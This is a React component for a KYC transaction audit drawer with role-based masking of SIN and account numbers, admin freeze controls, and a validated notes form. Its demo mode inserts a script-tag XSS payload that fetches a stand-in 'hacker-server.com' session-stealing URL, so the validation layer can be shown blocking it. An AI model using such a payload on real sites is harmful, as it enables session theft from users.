import { useEffect, useRef, useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { X, FileText, CheckCircle, Lock, RotateCcw, Eye, EyeOff, ShieldCheck } from 'lucide-react';
import { RequireRole } from '../../auth/components/RequireRole';
import { useAuthStore } from '../../auth/store/useAuthStore';
import { DemoBeacon } from '../../../core/components/DemoBeacon';
import { useDemoMode } from '../../../core/hooks/useDemoMode';
import { useFocusTrap } from '../../../core/hooks/useFocusTrap';
import { useDrawerHistory } from '../../../core/hooks/useDrawerHistory';
import { auditSchema, type AuditPayload } from '../schemas/auditSchema';
import { useAuditStore } from '../store/useAuditStore';
import { maskAccount, maskSin } from '../utils/dataRedaction';

interface AuditDrawerProps {
  isOpen:          boolean;
  onClose:         () => void;
  transactionId:   string | null;
  sinNumber?:      string | null;
}

// AuditDrawer — AODA-compliant sliding panel for KYC transaction annotation.
// Focus Trap and History API are delegated to dedicated hooks; presentation only.
export const AuditDrawer = ({ isOpen, onClose, transactionId, sinNumber }: AuditDrawerProps) => {
  const { isDemoMode } = useDemoMode();
  const role = useAuthStore((state) => state.user?.role);
  const [isRevealed, setIsRevealed] = useState(false);
  const [isXRayMode, setIsXRayMode] = useState(false);
  const [recoveryRequested, setRecoveryRequested] = useState(false);
  // Enforce unconditional global state subscription to comply with React Rules of Hooks, averting fatal unmounts during conditional renders.
  const isFrozen = useAuditStore((state) =>
    transactionId ? !!state.frozenRecords[transactionId] : false
  );
  const toggleFreeze = useAuditStore((state) => state.toggleFreeze);
  const drawerRef     = useRef<HTMLDivElement>(null);
  const firstFocusRef = useRef<HTMLButtonElement>(null);

  useFocusTrap(drawerRef, isOpen, onClose, { firstFocusRef });
  useDrawerHistory(isOpen, onClose);

  const {
    register,
    handleSubmit,
    reset,
    setValue,
    trigger,
    formState: { errors, isSubmitting, isSubmitSuccessful },
  } = useForm<AuditPayload>({
    resolver: zodResolver(auditSchema),
  });

  // Reset form state and reveal state on drawer close to prevent stale payload persistence
  // across separate transaction selections.
  useEffect(() => {
    if (!isOpen) {
      reset();
      setIsRevealed(false);
      setRecoveryRequested(false);
    }
  }, [isOpen, reset]);

  const onSubmit = async (payload: AuditPayload) => {
    // Simulate async dispatch to audit log endpoint
    await new Promise((resolve) => setTimeout(resolve, 800));
    // eslint-disable-next-line no-console
    console.warn('[AuditDrawer] Sanitized audit payload dispatched:', payload);
  };

  return (
    <>
      {/* Backdrop — click-to-close affordance, aria-hidden to exclude from AT tree */}
      <div
        aria-hidden="true"
        onClick={onClose}
        className={`fixed inset-0 z-40 bg-black/40 transition-opacity duration-300 ${
          isOpen ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'
        }`}
      />

      {/* Drawer panel */}
      <div
        ref={drawerRef}
        role="dialog"
        aria-modal="true"
        aria-label="Transaction Audit Panel"
        className={`fixed inset-y-0 right-0 z-50 flex flex-col w-full max-w-md bg-surface border-l border-border shadow-2xl transition-transform duration-300 ease-in-out ${
          isOpen ? 'translate-x-0' : 'translate-x-full'
        }`}
      >
        {/* Drawer header — title and close with discrete Decoupling Matrix toggle in document flow */}
        <div className="flex items-center justify-between px-5 py-4 border-b border-border bg-surface-elevated">
          <div className="flex items-center gap-2">
            <FileText className="w-4 h-4 text-text-muted" />
            <h2 className="text-sm font-semibold text-text-primary">Audit Annotation</h2>
          </div>
          <div className="flex items-center gap-2">
            <div className="relative">
              <DemoBeacon message="👇 Click to test security " />
              <button
                type="button"
                onClick={() => setIsXRayMode((prev) => !prev)}
                aria-label={isXRayMode ? 'Disable Zod X-Ray mode' : 'Enable Zod X-Ray mode'}
                className={`text-[10px] font-mono tracking-wider transition-colors focus:outline-none focus:ring-2 focus:ring-border-focus rounded px-1 ${
                  isXRayMode ? 'text-emerald-500' : 'text-slate-500 hover:text-slate-300'
                }`}
              >
                [ 👁️Audit Mode: {isXRayMode ? 'ON' : 'OFF'} ]
              </button>
            </div>
            <button
              ref={firstFocusRef}
              onClick={onClose}
              aria-label="Close audit drawer"
              className="p-1.5 rounded-lg text-text-muted hover:text-text-primary hover:bg-background transition-colors focus:outline-none focus:ring-2 focus:ring-border-focus"
            >
              <X className="w-4 h-4" />
            </button>
          </div>
        </div>

        {/* Transaction context — RBAC masking: ANALYST sees last-four only. */}
        <div className="px-5 py-3 border-b border-border bg-background space-y-3">
          <div>
            <p className="text-xs text-text-muted">Transaction ID</p>
            <p className="mt-0.5 text-sm font-mono font-medium text-text-primary">
              {transactionId == null ? '—' : maskAccount(transactionId, role)}
            </p>
          </div>
          <div className="flex items-center justify-between gap-2">
            <div>
              <p className="text-xs text-text-muted">SIN</p>
              <p className="mt-0.5 text-sm font-mono font-medium text-text-primary">
                {sinNumber != null
                  ? maskSin(sinNumber, role ?? 'ANALYST', isRevealed)
                  : '—'}
              </p>
            </div>
            {sinNumber != null && (
              <RequireRole allowedRoles={['ADMIN']}>
                <button
                  type="button"
                  onClick={() => setIsRevealed((prev) => !prev)}
                  title={isRevealed ? 'Mask SIN' : 'Reveal SIN'}
                  aria-label={isRevealed ? 'Mask SIN' : 'Reveal SIN'}
                  className="flex items-center gap-1.5 px-2.5 py-1 text-xs font-medium rounded-lg border border-border text-text-muted hover:text-text-primary hover:bg-background transition-colors focus:outline-none focus:ring-2 focus:ring-border-focus"
                >
                  {isRevealed ? (
                    <><EyeOff className="w-3.5 h-3.5" /> Mask SIN</>
                  ) : (
                    <><Eye className="w-3.5 h-3.5" /> Reveal SIN</>
                  )}
                </button>
              </RequireRole>
            )}
          </div>
        </div>

        {/* Audit form */}
        <form
          onSubmit={handleSubmit(onSubmit)}
          className="flex flex-col flex-1 gap-4 px-5 py-5 overflow-y-auto"
        >
          <div className="flex flex-col gap-1.5">
            <label
              htmlFor="audit-notes"
              className="text-xs font-medium text-text-muted uppercase tracking-wide"
            >
              Analyst Notes
            </label>
            {/* Safari iOS Zoom Prevent: font-size must be >= 16px on mobile or Safari
                auto-zooms the viewport on focus. text-[16px] on small viewports, md:text-sm above. */}
            {/* State-machine lockout: freeze action disables annotation to demonstrate RBAC enforcement. */}
            <textarea
              id="audit-notes"
              {...register('notes')}
              rows={8}
              disabled={isFrozen}
              placeholder="Document the rationale for this transaction review. All input is HTML-sanitized before persistence."
              className={`w-full resize-none rounded-lg border border-border px-3 py-2 text-[16px] md:text-sm text-text-primary placeholder:text-text-muted focus:outline-none focus:ring-2 focus:ring-border-focus transition-colors ${
                isFrozen ? 'bg-slate-200 cursor-not-allowed opacity-70 dark:bg-slate-800' : 'bg-background'
              }`}
            />
            <p className="text-xs text-text-muted text-right">Max 1,000 characters</p>
            {isDemoMode && (
              <div className="mt-2">
                <button type="button" disabled={isFrozen} onClick={async () => { setValue('notes', "<script>fetch('http://hacker-server.com/steal-session')</script>"); await trigger('notes'); }} className="flex items-center gap-2 px-3 py-2 bg-rose-500/10 hover:bg-rose-500/20 text-rose-500 border border-rose-500/30 rounded-md text-xs font-bold transition-colors disabled:opacity-50 disabled:cursor-not-allowed">
                  👾 Simulate Hacker Attack
                </button>
              </div>
            )}
            {/* Intercept and visualize raw Zod validation payload to demonstrate logic layer decoupling. */}
            {isDemoMode && errors.notes && (
              <div className="mt-2 p-3 bg-emerald-500/10 border border-emerald-500/30 rounded-lg flex items-start gap-2 animate-in fade-in slide-in-from-top-1">
                <ShieldCheck className="w-5 h-5 text-emerald-500 mt-0.5 shrink-0" />
                <div className="flex flex-col">
                  <span className="text-xs font-bold text-emerald-600 dark:text-emerald-400 uppercase tracking-wide">Threat Neutralized</span>
                  <span className="text-xs text-slate-600 dark:text-slate-300 mt-1">Zero-Trust Gateway successfully blocked a malicious script attack. Your financial data is secure. (Activate Developer Mode above for logs).</span>
                </div>
              </div>
            )}
            {!isDemoMode && errors.notes && !isXRayMode && (
              <p className="text-xs text-red-500">{errors.notes.message}</p>
            )}
            {errors.notes && isXRayMode && (
              <div className="mt-2 bg-slate-950 border border-slate-800 rounded-lg overflow-hidden animate-in fade-in zoom-in-95 duration-300">
                <div className="flex items-center justify-between px-3 py-2 border-b border-slate-800 bg-slate-900">
                  <span className="text-[10px] font-mono text-emerald-400 uppercase tracking-widest flex items-center gap-2">
                    <span className="w-1.5 h-1.5 rounded-full bg-emerald-500 animate-pulse"></span>
                    Live Cryptographic Payload & State Machine Log
                  </span>
                </div>
                <pre className="p-3 text-xs font-mono overflow-x-auto whitespace-pre-wrap text-slate-300">
                  {/* Sanitize error payload to prevent circular DOM reference crashes during JSON serialization. */}
                  {JSON.stringify(
                    {
                      type: errors.notes.type,
                      message: errors.notes.message,
                      ref: '[DOM_NODE_REDACTED]',
                    },
                    null,
                    2
                  )}
                </pre>
              </div>
            )}
          </div>

          {/* AODA aria-live region — screen readers announce submission status
              without preempting the current narration context (polite politeness). */}
          <div aria-live="polite" aria-atomic="true" className="min-h-[24px]">
            {isSubmitSuccessful && (
              <div className="flex items-center gap-2 text-xs font-medium text-green-500">
                <CheckCircle className="w-3.5 h-3.5" />
                Audit log entry committed successfully.
              </div>
            )}
          </div>

          {/* High-privilege actions — RBAC: ANALYST cannot see or interact; DOM cloaking via RequireRole. */}
          <RequireRole allowedRoles={['ADMIN']}>
            <div className="flex flex-col w-full">
              <div className="flex flex-wrap gap-2" role="group" aria-label="Administrator account actions">
                {/* State-machine lockout triggered by high-privilege freeze action; toggles form editability via global store. */}
                <button
                  type="button"
                  onClick={() => transactionId != null && toggleFreeze(transactionId)}
                  className={`inline-flex items-center gap-2 px-3 py-2 text-sm font-medium rounded-lg transition-colors focus:outline-none focus:ring-2 focus:ring-border-focus ${
                    isFrozen
                      ? 'border border-slate-400 text-slate-500 hover:bg-slate-100 dark:border-slate-600 dark:text-slate-400 dark:hover:bg-slate-800/50'
                      : 'border border-red-500/40 text-red-400 hover:bg-red-500/10 focus:ring-red-500/50'
                  }`}
                >
                  <Lock className="w-4 h-4" />
                  {isFrozen ? '[ LOCKED ] Unfreeze Account' : 'Freeze Account'}
                </button>
                {/* Mock Step-Up authentication for Zero-Trust compliance demonstration. */}
                <button
                  type="button"
                  onClick={() => setRecoveryRequested(true)}
                  className="inline-flex items-center gap-2 px-3 py-2 text-sm font-medium rounded-lg border border-amber-500/40 text-amber-400 hover:bg-amber-500/10 transition-colors focus:outline-none focus:ring-2 focus:ring-amber-500/50"
                >
                  <RotateCcw className="w-4 h-4" />
                  Initiate Recovery
                </button>
              </div>
              {recoveryRequested && (
                <div className="w-full mt-2 text-[10px] font-mono text-red-500 animate-pulse">
                  [AUTH_STEP_UP] Hardware Security Key (YubiKey) signature required.
                </div>
              )}
            </div>
          </RequireRole>

          <div className="mt-auto flex gap-3">
            <button
              type="button"
              onClick={onClose}
              className="flex-1 py-2 text-sm font-medium rounded-lg border border-border text-text-primary hover:bg-surface-elevated transition-colors focus:outline-none focus:ring-2 focus:ring-border-focus"
            >
              Cancel
            </button>
            <button
              type="submit"
              disabled={isSubmitting || isFrozen}
              className="flex-1 py-2 text-sm font-semibold rounded-lg bg-primary text-white hover:bg-primary-hover transition-colors focus:outline-none focus:ring-2 focus:ring-border-focus disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isSubmitting ? 'Committing...' : 'Submit Audit'}
            </button>
          </div>
        </form>
      </div>
    </>
  );
};